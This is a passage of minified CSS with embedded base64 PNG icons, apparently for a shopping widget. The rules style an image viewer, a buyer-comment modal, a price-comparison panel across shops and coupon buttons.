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);cursor:pointer;margin-bottom:6px}#dyp779946-fix-full .dyp779946-scroll-top P.scroll{background-position:0 0}#dyp779946-detail-box{display:none;position:absolute;top:50px;left:50%;width:1104px;margin-left:-552.5px;min-width:516px;box-sizing:border-box;border-radius:5px}.dyp779946-waterfallDetail-back{height:561px;background-color:#f2f2f2;position:relative;text-align:center;padding-bottom:40px}.dyp779946-waterfallDetail-back button{position:absolute;width:18px;height:100%;top:0;border:0;cursor:pointer;outline:0}.dyp779946-waterfallDetail-back button:hover{opacity:.5}.dyp779946-waterfallDetail-back button.l{left:140px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAeCAYAAAAhDE4sAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkUyM0QwNTI4QjU5MTExRTdBQTI3OUE2RDI2OTAzQTk5IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkUyM0QwNTI5QjU5MTExRTdBQTI3OUE2RDI2OTAzQTk5Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RTIzRDA1MjZCNTkxMTFFN0FBMjc5QTZEMjY5MDNBOTkiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RTIzRDA1MjdCNTkxMTFFN0FBMjc5QTZEMjY5MDNBOTkiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6CBiiCAAABlklEQVR42pyVTSgFURTHx3uTj/V7sbRFsrITYoP183gsZMsMkiT5SEoJ6WFebCUlZMvC54qytVOysWVhS/mfOqPpdN97c+6p3+Y/M7/unHvnTIXneY5FjYNV8AH6gyB4TVhIlkABpEAL2KTQVUr2gC+yN62owK8UrXuwoBGdgqzIzkEO/fmNK6IHMiI7AUOQ/Aelmp0EtwbJAUnkzcVEVeAOdIl8G4yZHjCJ0uAZtIt8BcwUW77sUR3vRIPIZ8FWqUZGRY3gEtQbTvF+uR1xIxJaSa24PgKO4pwP6lEbeDJIcnEl4Ypoiysj2Q/oA9eab8cVki/QAV60X7Lc/mrQazNXEnzwwqrhsbBjI+oGFyKf5JGhfrUMf5zRorlzbNMjGhNn4vowjxB1swdAILIsjw2ViGoC7IpsEFzxaIktopoCeZH18OFNakRU02BRZHRYb0yTtdzvaA3MiawTPPLcii2i2gDzImsFD77vpzQiqnXDr6iJRg9kaY3I4eE2KrJmsKwVUR0aZN82v+xQ9slH5J03xPkTYADDB0dhGrrzZAAAAABJRU5ErkJggg==) center no-repeat}.dyp779946-waterfallDetail-back button.r{right:140px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAeCAYAAAAhDE4sAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjBGMkJFN0U2QjU5MjExRTdBMjRCQ0UwNTZBQTRDQTVCIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjBGMkJFN0U3QjU5MjExRTdBMjRCQ0UwNTZBQTRDQTVCIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MEYyQkU3RTRCNTkyMTFFN0EyNEJDRTA1NkFBNENBNUIiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MEYyQkU3RTVCNTkyMTFFN0EyNEJDRTA1NkFBNENBNUIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6tz+vJAAABxUlEQVR42qSVzytEURiGr5kb9sTCgo3yu2wJKWLPSBayxNxIkoQJZYM0wwxrScSwkWz8zAL5A+z8BVMWFkppPKeOur6uce516u3rvufc5577ne+ckxeNRisty0qjMhRLJpNbVoAWQquoARWhlOM480FBL8JbArYZBDSLboQPy0n5ApGTd2KHzpO7jQI7NAXlZbNZ9zT2Cf1izDEf6/UF0rBtwrAYd406AX7mytGPxuARwrqw2xWMjxQYgzRskrAg7Bb0BKzYGKRhi4QpYdejO2ClxiANW1OrJ+wq9Ais2hikYSr5g8IuV7XnhoVMagTYrkdZlKAHYM2ey5+r8ZIq3HNku+wP1BTysw2Y2QWhEb267Hy0GAqw0btRofCebT8Efi1BGPOo+pjtA6KOFkfYJ/xujyWSlguyRxgQdhpI5PvBNoCooyQi7CMgfcYFCeTAA5KUkF9nBCBMOENdomsDyLjXO/YvkCvUKrriQCaMjhEgCnzpAZnLBfkB0ufMPWoTY6aBLP+1KLaGqDvtFtWI/hkgKyYlEs5kMsX6OqqVtwiQuGnBqhnFUJ3wh4Ds+L0g3/4L+Z6RSqQ6gytQAshpkLv/S4ABAA1zkbLDFeGeAAAAAElFTkSuQmCC) center no-repeat}.dyp779946-waterfallDetail-page{position:absolute;bottom:40px;right:40px}.dyp779946-waterfallDetail-img{top:50%;transform:translateY(-50%);position:relative;text-align:center;display:inline-block}.dyp779946-waterfallDetail-img img{background-color:#fff;vertical-align:bottom;border:1px solid #B7B7B7;padding:20px;max-width:642px;max-height:519px}.dyp779946-waterfallDetail-title{text-align:left;position:absolute;width:calc(100% - 42px);bottom:20px;left:21px;color:#fff;padding:17px;box-sizing:border-box;overflow:hidden;background-color:rgba(0,0,0,.5);height:89px}.dyp779946-waterfallDetail-title .dypAnimate{overflow:hidden;display:-webkit-box;text-overflow:ellipsis;-webkit-box-orient:vertical;-webkit-line-clamp:1}.dyp779946-waterfallDetail-title p{line-height:20px}.dyp779946-waterfallDetail-title p.dypBold{font-weight:700;border-bottom:1px solid #fff;padding-bottom:7px;margin-bottom:7px}.dyp779946-waterfallDetail-title p.dyp-topMargin{margin-top:15px}.dyp-detail-thumb{margin-top:24px}.dyp-detail-thumb>div{position:relative;text-align:center;float:left;width:130px;height:130px;background-color:#f2f2f2;margin-right:28px;padding:14px;border:2px solid transparent}.dyp-detail-thumb img{max-width:130px;max-height:130px;position:absolute;top:50%;transform:translate(-50%,-50%)}.dyp-detail-thumb>div.active{border-color:#F03}#dyp779946-fix-full .dyp779946-scroll-top P.qq{background-position:-108px 0}#dyp779946-fix-full .dyp779946-scroll-top P.scroll:hover{background-position:-54px 0}#dyp779946-fix-full .dyp779946-scroll-top P.qq:hover{background-position:-162px 0}.dypMid9527-must-see-modal{position:fixed;left:0;top:0;width:100%;height:100%;z-index:9999999999;overflow-y:scroll;background-color:rgba(0,0,0,.6);visibility:visible;display:none}.dypMid9527-cic-acomment-pics,.dypMid9527-cip-comment-items,.dypMid9527-cit-right-params{overflow:hidden}.dypMid9527-must-see-box{position:absolute;top:80px;left:50%;width:760px;margin-left:-380px;background-color:#F4F4F4;box-shadow:rgba(0,0,0,.2) 0 0 20px;box-sizing:border-box;border:1px solid #F4F4F4;border-image:initial;border-radius:5px}.dypMid9527-must-see-GoTop,.dypMid9527-must-see-close-btn{transform:translate3d(0,0,0);z-index:2147483647;position:fixed;display:none;cursor:pointer}.dypMid9527-must-see-close-btn{top:80px;right:40px;width:20px;height:20px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAJ1BMVEUAAAD////z8/Pz8/P09PTt7e3////////09PTy8vL29vbz8/P09PSOrWHFAAAADHRSTlMAE9TcyhwMBst4h2r93WnJAAAAaUlEQVQI1yXNsRFAUBBF0SfAEBkd/EiiBIlIARowNKAUpajBCH5Z1n0bvTnBXWkTV0lt8lwv7U/3r3JaVIwJfEP64MBZgo0waAbNoDmDNGnTzG7TpO1HtEHJTBMGzUcg7UFNIHxLp2etD+08GVd0kX9rAAAAAElFTkSuQmCC) center center no-repeat}.dypMid9527-must-see-GoTop{bottom:30px;left:85%;width:40px;height:40px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoBAMAAAB+0KVeAAAAGFBMVEX///+ZmZmcnJzMzMyenp67u7uzs7Orq6sDd4CHAAAAXElEQVQoz2MYaYDZAIugoTAWhYKCBpgKBQWFsSgEKsVUCFJKYwC0Q4BVSTGAUVBQDCHKyMDAxMCgAKLQBR2AFAuKIAtEkAlTUFBQHJt2BgyLMARZVZwCGBlGFAAA478FoH4MYBMAAAAASUVORK5CYII=) center center no-repeat}.dypMid9527-must-see-head{width:100%;position:relative;height:73px}.dypMid9527-must-see-head-title{line-height:50px;font-size:18px;font-family:Arial,"Microsoft Yahei",serif;float:left;width:117px;height:25px;margin:24px;background:url(data:image/png;base64,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) center center no-repeat}.dypMid9527-question-item-desc,.dypMid9527-question-item-desc-item{line-height:22px;font-size:12px;color:#666}.dypMid9527-must-see-head-total{float:right;font-family:Arial,"Microsoft Yahei",serif;margin-top:27px;margin-right:30px;padding-bottom:20px;font-size:14px;color:#999;position:relative}.dypMid9527-must-see-box .arrow_1,.dypMid9527-must-see-box .arrow_2,.dypMid9527-question-dialog{position:absolute;display:none;background-color:#fff}.dypMid9527-question-rule{cursor:pointer}.dypMid9527-question-title{display:block;float:left}.dypMid9527-question-icon{width:14px;height:14px;display:block;float:left;margin-top:4px;margin-left:10px;cursor:pointer;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASBAMAAACk4JNkAAAAG1BMVEUAAAD3XV33XV33Xl73Xl73X1/4YGD3YGD2XV11gks4AAAACHRSTlMA8djAmkMlPXIsu/oAAABYSURBVAjXY2BgYHUSVAlgAAI2i46OjuYEIKuwAwTEgUISYFZjAgMzkGIAYgOGCCirlcEDymph0ICymhgkoKxGBAss2wGW9YCyWhCmIExG2IZwAcJVCJcCAOlSO+cvo7fqAAAAAElFTkSuQmCC) center center no-repeat}.dypMid9527-question-dialog{left:-268px;top:30px;width:410px;height:330px;z-index:999;border-radius:5px;border:1px solid #EEE}.dypMid9527-question-padding{padding:20px}.dypMid9527-must-see-box .arrow_1{width:10px;height:10px;border:1px solid #dfdfdf;top:23px;left:50px;transform:rotate(-45deg) skew(-10deg,-10deg);z-index:998}.dypMid9527-must-see-box .arrow_2{width:12px;height:0;border-top:1px solid #fff;top:30px;left:50px;z-index:1000}.dypMid9527-question-item{border-bottom:1px solid #e6e7eb}.dypMid9527-question-item-last{border-bottom:none}.dypMid9527-question-item-title{color:#666;font-weight:700;padding-top:10px;padding-bottom:3px}.dypMid9527-question-item-desc{padding-bottom:10px}.dypMid9527-must-see-box .color-gray{color:#999}.dypMid9527-must-see-body{position:relative;height:auto;width:100%;padding:0}.dypMid9527-must-see-footer{height:auto;width:100%;padding:0;margin:40px 0 20px}.dypMid9527-must-see-footer p{text-align:center;font-size:14px;color:#999;line-height:14px}.dypMid9527-comments-item{background-color:#fff;margin:0 30px 15px;border:1px solid #e6e7eb;border-image:initial}.dypMid9527-comments-item-padding{padding:20px 20px 12px}.dypMid9527-comments-item-top{padding-bottom:10px;overflow:hidden;border-bottom:1px solid #f2f3f5}.dypMid9527-cit-left{float:left}.dypMid9527-cit-left-portrait{float:left;width:34px;height:34px}.dypMid9527-cit-left-next{float:left;margin-left:10px;line-height:17px}.dypMid9527-cit-ln-nickname{font-size:14px;color:#555}.dypMid9527-cit-ln-nickname-next{float:left;margin-top:6px;line-height:17px}.dypMid9527-cit-right-type{color:#ff465f;font-weight:700;display:inline-block}.dypMid9527-cit-right-data{color:#999;display:inline-block}.dypMid9527-cit-right{float:right;line-height:17px}.dypMid9527-cit-right-params{margin-top:17px;color:#999;max-width:500px}.dypMid9527-cic-fcomment{padding-top:12px;padding-bottom:12px}.dypMid9527-cic-fcomment-content-title{color:#F79503;font-weight:700}.dypMid9527-cic-fcomment-content-text{color:#333}.dypMid9527-cip-comment-item{width:42px;height:42px;float:left;border:1px solid #fff;border-image:initial;margin:2px 10px 7px 0}.dypMid9527-cip-comment-large-mode{margin-top:5px;margin-bottom:10px;display:inline-block;position:relative;padding:10px;border:1px solid #e6e7eb;border-image:initial}.dypMid9527-cip-comment-large-mode img{max-width:400px}.dypMid9527-cip-comment-img-switch-btn-left{height:100%;position:absolute;left:0;top:0;width:80px;cursor:pointer}.dypMid9527-cip-comment-img-prev-btn{width:40px;height:80px;position:absolute;top:50%;margin-top:-45px;left:10px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAABaCAMAAADNRvW0AAAARVBMVEUAAADIyMgjIyMTExPAwMBeXl4yMjLGxsbDw8O6urq0tLSurq6np6ednZ2QkJCFhYVOTk5AQECSkpKCgoJ4eHhJSUnMzMzHt9JOAAAAFnRSTlOA+ouF8KWR9/Pq5N3WzsW8nZfGurOa9+apoAAAAI9JREFUWMPt1DkWgzAQBFEBQuwGvMz9j2q3I0JVQNaV//dAGk1yzjnnrn2weMcDij0iXkg841dTgNj+oq8H3SoxHEAsEuNZL9pZIhcgJomprRclS8xAnKPE0tWLY5BYgegbiS1BwUYrS+zpBgI+jP4+P2R+lXxg+Fjy4edPjD9kvi74UuKrjy9Yvsadc865L/31DCeeB06JAAAAAElFTkSuQmCC) center center no-repeat;display:none}.dypMid9527-cip-comment-img-switch-btn-right{height:100%;position:absolute;left:340px;top:0;width:80px;cursor:pointer}.dypMid9527-cip-comment-img-next-btn{width:40px;height:80px;position:absolute;margin-top:-45px;top:50%;right:10px;display:none;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAABaCAMAAADNRvW0AAAARVBMVEUAAADIyMgjIyMTExPAwMBeXl4yMjLGxsbDw8O6urq0tLSurq6np6ednZ2QkJCFhYVOTk5AQECSkpKCgoJ4eHhJSUnMzMzHt9JOAAAAFnRSTlOA+ouF8KWR9/Pq5N3WzsW8nZfGurOa9+apoAAAAI1JREFUWMPt1LkShCAQRVFUxBWXWfr/P3XmGZnewOzd/FRR0HRyzjnn0heLLT5QvCNiR6I08W9Dpr9MReYYZNaOmHOUWZApWWZuiWknmYmZWSYXYrpFZjyRWWWGI5GqTNMj8wpudpn8MOEHq0CASwZPCQYGjCUYfvrF+Efm64IvJb76+ILla9w555y79QMDygwnhhawYQAAAABJRU5ErkJggg==) center center no-repeat}.dypMid9527-cic-acomment{padding-top:12px;border-top:1px solid #f2f3f5}.dypMid9527-cic-fcomment-content{font-size:14px;color:#666;line-height:22px}.dypMid9527-cic-fcomment-content-titles{color:#ff465f;font-weight:700}.dypMid9527-cip-comment-item img{width:42px;height:42px;cursor:pointer}.dypMid9527-AllShop-price{position:absolute;width:140px;height:246px;top:-2px;right:-142px;border:2px solid #F03;border-left:none;background:#fff;display:none}.dypMid9527-AllShop-box{width:140px;height:220px;margin-top:13px;border-left:2px solid #EEE}.dypMid9527-AllShop-title{padding-left:10px}.dypMid9527-World-icon{display:inline-block;margin:0 4px 0 0;width:17px;height:18px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAASBAMAAABP1yhnAAAAFVBMVEUAAAAzMzM1NTUzMzM0NDQzMzMzMzNnM1F8AAAABnRSTlMA+IiBiYI3DzJgAAAAR0lEQVQI12MwTAMCUQYgEAARjCAiAUSwgVkgWTaEGFGyLGJpaYkKIFlGkJgASIwNxEpAYgmAWIxAFsQFwjhsALsJ7jomsMkAVsQRG0Oc//sAAAAASUVORK5CYII=) center center no-repeat}.dypMid9527-World-title{font-size:16px;color:#333;line-height:16px}.dypMid9527-AllShop-item{height:14px;padding:7.5px 0 7.5px 10px;line-height:14px}.dypMid9527-shop-name{display:inline-block;width:42px;font-size:14px;color:#999;cursor:pointer}.dypMid9527-shop-price{display:inline-block;height:14px;font-size:14px;color:#FD2550}.dypMid9527-low-price-icon{position:absolute;display:inline-block;width:27px;height:14px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAOCAMAAADpEZdPAAAAsVBMVEUAAAD+PWP/K1b+K1X+LFb+KlT+dpH+LFb/KVP/Llj/KVP/KFT/M1X/pbb////9JVD/+Pr/rr7/n7L+bIn/1d3/w8/+co7/qbr+b4z+aYf/v8z/0dr/orX+fZb/v8v/ucf+h5/+VXf//f3/6+//4uj/ztj+jaP+gZr+dpH+ZIP/8vX/6O3/5Or/3OP/ydT/rLz/m6//lqv+hJ3+YID+TnH+SGz+Q2n+OmH/tMP+ZoX+MltfF4kWAAAADnRSTlMA8Snz6vn112lgSiYP/HYQyPUAAADZSURBVBjTfdDZbsIwEIXhttC9PXFsx4mxyb4CZV/avv+DdbBK4ALx337SaHTuqJeBd6XhG9HH4xeuNBqSPdwD08A1BcDzfFLK+Qzev/lrn1r7gBQ2iw7psjpbE1INmZ7zEcQEONr78xOQiDElEkiP8Rht4ex18AmkWimtqFrvGd9lh202dhYC0FKKKo5j5keMbq6Ci5udtXqhki2Ds2QJ9L9s2vYH0SKEs0IqmN60+d6F/Lc82kpk5UZ2J+ONDTqRGlGTpdYIs6/J+s2qAgCDzAHMwGizW1v/AYHuHPZBfldIAAAAAElFTkSuQmCC) center center no-repeat}.dypMid9527-AllShop-item:hover{opacity:.5;background:#FD2550}.dypMid9527-AllShop-item:hover .dypMid9527-shop-name,.dypMid9527-AllShop-item:hover .dypMid9527-shop-price{color:#fff}.dypMid9527-question-item-desc-item a{color:#2366fe;text-decoration:underline}#dypBot9527{height:100%;float:left;display:flex;align-items:center;font-family:Arial,"Microsoft Yahei",serif}#dypBot9527>div{float:left}.dypBot9527-icon{width:32px;height:32px}.dypBot9527-biKan,.dypBot9527-buyerShow,.dypBot9527-coupon{position:relative;height:28px;line-height:30px;border:2px solid #f03;border-left:0;font-size:12px;cursor:pointer;color:#333;display:none}.dypBot9527-biKan a,.dypBot9527-buyerShow a,.dypBot9527-coupon a{display:inline-block;padding:0 5px!important;border:0!important;color:#333;font-size:12px;font-family:Arial,"Microsoft Yahei",serif;text-decoration:none}.dypBot9527-biKan span,.dypBot9527-buyerShow span,.dypBot9527-coupon 